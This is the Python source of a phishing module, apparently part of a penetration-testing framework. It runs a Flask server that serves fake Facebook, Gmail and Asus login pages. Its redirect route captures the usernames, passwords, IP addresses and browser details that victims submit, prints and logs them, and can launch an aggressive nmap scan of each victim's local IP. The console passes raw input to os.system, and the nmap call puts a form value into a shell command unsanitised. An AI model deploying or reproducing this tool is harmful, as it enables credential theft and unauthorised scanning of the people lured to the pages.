#!/usr/bin/env python3
#
# MIT - (c) 2016 ThomasTJ (TTJ)
#
# Module for WMDframe
# This modules is used for creating a local flask server with phishing pages
#


import argparse
import os
from datetime import datetime
from flask import Flask, render_template, request, redirect
try:
    import core.core as core
    import core.commands as comm
    import core.modules as cmodules
    from core.colors import bc as bc
except:
    import sys
    sys.path.append('././')
    import core.core as core
    import core.commands as comm
    import core.modules as cmodules
    from core.colors import bc as bc


# ==========================
# Parser START
# ==========================
parser = argparse.ArgumentParser()
parser.add_argument('-r', '--run', action='store_true', help='Start monitoring')
parser.add_argument('-p', '--page', action='store_true', help='f = facebook, g = gmail, a = asus')
args, unknown = parser.parse_known_args()
# ==========================
# Parser END
# ==========================


# ==========================
# Core START
# ==========================
config = core.config()
NMAP_SYM = (config['TOOLS']['NMAP_SYM'])

# logger = core.log()
# logger.debug('Starting module')
# ==========================
# Core END
# ==========================


# ==========================
# Log files, global variables, etc. START
# ==========================

# ==========================
# Log files, global variables, etc. end
# ==========================


# OPTIONS
class Options():
    """Main class for module."""

    Author = 'Thomas TJ (TTJ)'
    Name = 'Webpage phishing'
    Call = 'webphis'
    Modulename = 'webpage_phishing'  # Filename
    Category = 'phishing'
    Type = 'webpage'  # sin = single action/program, aut = multiple programs combined for attack
    Version = '0.1'
    License = 'MIT'
    Description = 'Run a local flask server with phishing pages.'
    Datecreation = '2017/02/01'
    Lastmodified = '2017/02/01'

    def __init__(self, fakepage, scan, log):
        """Define variables and show options on run."""
        self.page = fakepage
        self.scan = scan
        self.log = log
        self.show_all()

    def poss_opt(self):
        """Possible options. These variables are checked when the user tries to 'set' an option."""
        return ('page', 'scan', 'log')

    def show_opt(self):
        """Show the possible options."""
        print(
            ''
            '\n\t' + bc.OKBLUE + ('%-*s %-*s %-*s %s' % (15, 'OPTION', 8, 'RQ', 18, 'VALUE', 'DESCRIPTION')) + bc.ENDC +
            '\n\t' + ('%-*s %-*s %-*s %s' % (15, '------', 8, '--', 18, '-----', '-----------')) +
            '\n\t' + ('%-*s %-*s %-*s %s' % (15, 'page:', 8, 'n', 18, self.page, 'This will set the landingpage (/), otherwise you\'ll need to append like "/facebook"')) +
            '\n\t' + ('%-*s %-*s %-*s %s' % (15, 'scan:', 8, 'n', 18, self.scan, 'Scan the victims local ip (y/n)')) +
            '\n\t' + ('%-*s %-*s %-*s %s' % (15, 'log:', 8, 'n', 18, self.log, 'Name of logfile. Empty = no logging, only printing to screen.')) +
            '\n'
        )
        print(
            '' +
            '\n\t' + bc.OKBLUE + 'AVAILABLE OPTIONS FOR PAGE setting:' + bc.ENDC +
            '\n\t' + 'a  -->  asus' +
            '\n\t' + 'f  -->  facebook' +
            '\n\t' + 'g  -->  gmail' +
            '\n'
            '\n\t' + bc.OKBLUE + 'AVAILABLE PHISING SITES:' + bc.ENDC +
            '\n\t' + '/asus' +
            '\n\t' + '/facebook' +
            '\n\t' + '/gmail' +
            '\n'
        )

    def show_commands(self):
        """Show the possible commands."""
        print(
            '' +
            '\n\t' + bc.OKBLUE + 'COMMANDS:' + bc.ENDC +
            '\n\t' + '---------' +
            '\n\t' + ('%-*s ->\t%s' % (9, 'run', 'Run the script')) +
            '\n\t' + ('%-*s ->\t%s' % (9, 'info', 'Information')) +
            '\n\t' + ('%-*s ->\t%s' % (9, 'so', 'Show options')) +
            '\n\t' + ('%-*s ->\t%s' % (9, 'sa', 'Show module info')) +
            '\n\t' + ('%-*s ->\t%s' % (9, 'set', 'Set options, set [PARAMETER] [VALUE]')) +
            '\n\t' + ('%-*s ->\t%s' % (9, 'invoke', 'Invoke module')) +
            '\n\t' + ('%-*s ->\t%s' % (9, 'exit', 'Exit')) +
            '\n'
        )

    def show_all(self):
        """Show all options.

        Sending main options to the core module modules.py for parsing.
        """
        cmodules.showModuleData(
            Options.Author,
            Options.Name,
            Options.Call,
            Options.Category,
            Options.Type,
            Options.Version,
            Options.Description,
            Options.License,
            Options.Datecreation,
            Options.Lastmodified
        )
        self.show_commands()
        self.show_opt()
# END OPTIONS


def get_html_page(short):
    """Looping through available pages and returning the choosen one."""
    if short == 'a':
        fakepage = 'asus.html'
    elif short == 'f':
        fakepage = 'facebook.html'
    elif short == 'g':
        fakepage = 'gmail.com'
    else:
        fakepage = 'https://www.youtube.com/watch?v=oHg5SJYRHA0'
    return fakepage


def save_log_file(results):
    """Save results to logfile."""
    logfile = 'logs/' + sop.log
    if not os.path.isfile(logfile):
        os.mknod(logfile)
    with open(logfile, 'a') as file:
        file.write(results)
    print(bc.OKGREEN + '\t[+]  Logfile save at: ' + logfile + bc.ENDC)


# ==================== #
# Defining FLASK
# ==================== #
app = Flask(__name__)


# ==================== #
# FLASK ROUTES - START
# ==================== #
@app.route('/')
def index():
    """Main index"""
    if sop.page:
        fakepage = get_html_page(sop.page)
        print('\tSomeone is going to visit ' + fakepage + '...')
        return render_template(fakepage)
    else:
        print('\tNothing specified for landing page.. going RickRoll...')
        return redirect("https://www.youtube.com/watch?v=oHg5SJYRHA0")


@app.route('/asus')
def asus():
    """Phishing page"""
    print("\tSomeone is visiting /asus...")
    return render_template('asus.html')


@app.route('/gmail')
def gmail():
    """Phishing page"""
    print("\tSomeone is visiting /gmail...")
    return render_template('gmail.html')


@app.route('/facebook')
def facebook():
    """Phishing page"""
    print("\tSomeone is visiting /facebook...")
    return render_template('facebook.html')


@app.route('/redirect', methods=['POST'])
def redirectUser():
    """Redirecting user after phishing"""
    Username = request.form['Username']
    Passwd = request.form['Passwd']
    redirectUser = request.form['redirect']
    iplocal = request.form['iplocal']
    ipexternal = request.form['ipexternal']
    network = request.form['network']
    browser = request.form['browser']
    print(
        '\n\t' + '[+]  Found something for you!' +
        '\n\t' + bc.OKGREEN + '[+]  Username: ' + Username +
        '\n\t' + bc.OKGREEN + '[+]  Password: ' + Passwd +
        '\n\t' + bc.WARN + '[+]  Redirect: ' + bc.ENDC + redirectUser +
        '\n\t' + bc.WARN + '[+]  Local ip: ' + bc.ENDC + iplocal +
        '\n\t' + bc.WARN + '[+]  Exter. ip: ' + bc.ENDC + ipexternal +
        '\n\t' + bc.WARN + '[+]  Network: ' + bc.ENDC + network +
        '\n\t' + bc.WARN + '[+]  Browser: ' + bc.ENDC + browser +
        '\n' + bc.ENDC
    )

    if sop.log:
        results = (
            '\n' + datetime.now().strftime('%Y-%m-%d %H:%M:%S') +
            '\nUsername: ' + Username +
            '\nPassword: ' + Passwd +
            '\nRedirect: ' + redirectUser +
            '\nIp local: ' + iplocal +
            '\nIp external: ' + ipexternal +
            '\nNetwork info: ' + network +
            '\nBrowser info: ' + browser +
            '\n'
        )
        save_log_file(results)

    if sop.scan.lower() == 'y':
        print('\t[*]  Initiating nmap scan. Results will NOT be saved.')
        comm.runCommand(NMAP_SYM + ' -A -sV -sC -T4 -v ' + iplocal, 'EwilTwinScan-' + iplocal)

    return redirect(redirectUser)
# ==================== #
# FLASK ROUTES - END
# ==================== #


def run():
    """The main run function."""
    print('\t[*]  Starting webserver on 0.0.0.0 and port 5001.')
    print('\t[*]  0.0.0.0 = Your LAN IP')
    print('\t[*]  Visit 0.0.0.0:5001/[FAKE_SITE]')
    # Production:
    app.run(host='0.0.0.0', port=5001)
    # Debug:
    # app.run(debug=True, host='0.0.0.0', port=5001)


def info():
    """Show the modules info - optional."""
    print("""
        Module for use in WMDframe.

        This module will setup a flask server serving fake pages.
        Redirect your victim to the page. The landingpages will
        show a loginpage. When the victim clicks the loginbutton
        the username, password and various client information is
        printed in the console.
        """)

    if parser.format_help():
        print('\n\t' + bc.OKBLUE + 'COMMANDLINE ARGUMENTS:' + bc.ENDC)
        for line in parser.format_help().strip().splitlines():
            print('\t' + line)
    print('')


# CONSOLE
def console():
    """The main console for the module."""
    value = input('   -> ' + bc.FAIL + 'wmd' + bc.ENDC + '@' + bc.FAIL + 'webphis:' + bc.ENDC + ' ')
    userinput = value.split()
    if 'so' in userinput[:1]:
        sop.show_opt()
    elif 'sa' in userinput[:1]:
        sop.show_all()
    elif 'info' in userinput[:1]:
        info()
    elif 'run' in userinput[:1]:
        run()
    elif 'set' in userinput[:1]:
        useroption = str(userinput[1:2]).strip('[]\'')
        uservalue = str(userinput[2:3]).strip('[]\'')  # Use single word after "set parameter"
        if useroption not in sop.poss_opt():
            print(bc.WARN + '\n    Error, no options for: ' + useroption + '\n' + bc.ENDC)
        elif useroption in sop.poss_opt():
            setattr(sop, useroption, uservalue)
            print('\n      ' + useroption + '\t> ' + uservalue + '\n')
    elif 'invoke' in userinput[:1]:
        comm.invokeModule(Options.Call)
        return None
    elif 'back' in userinput[:1] or 'exit' in userinput[:1]:
        return None
    elif ':' in userinput[:1]:
        print('')
        os.system(str(value[1:]))
        print('')
    else:
        command = str(userinput[:1]).strip('[]\'')
        print(bc.WARN + '\n    Error, no options for: ' + command + '\n' + bc.ENDC)
    console()
# END console


def main():
    """The first function to run."""
    print('\n')
    print('\t _       __     __                              ____  __    _      __    _              ')
    print('\t| |     / /__  / /_  ____  ____ _____ ____     / __ \/ /_  (_)____/ /_  (_)___  ____ _  ')
    print('\t| | /| / / _ \/ __ \/ __ \/ __ `/ __ `/ _ \   / /_/ / __ \/ / ___/ __ \/ / __ \/ __ `/  ')
    print('\t| |/ |/ /  __/ /_/ / /_/ / /_/ / /_/ /  __/  / ____/ / / / (__  ) / / / / / / / /_/ /   ')
    print('\t|__/|__/\___/_.___/ .___/\__,_/\__, /\___/  /_/   /_/ /_/_/____/_/ /_/_/_/ /_/\__, /    ')
    print('\t                 /_/          /____/                                         /____/     ')
    print('\n')
    print('\t' + bc.OKBLUE + 'CHECKING REQUIREMENTS' + bc.ENDC)
    comm.checkInstalledOpt(NMAP_SYM)
    print('')
    if args.page:
        fakepage = get_html_page(args.page)
    else:
        fakepage = ''
    # The parameters to be passed to the module on init
    global sop
    sop = Options(fakepage, 'n', 'EwilTwin.log')
    if args.run:
        run()
    else:
        console()


if args.run:
    main()


# For testing uncomment "main()" and run module with "python3 modulename.py"
# main()
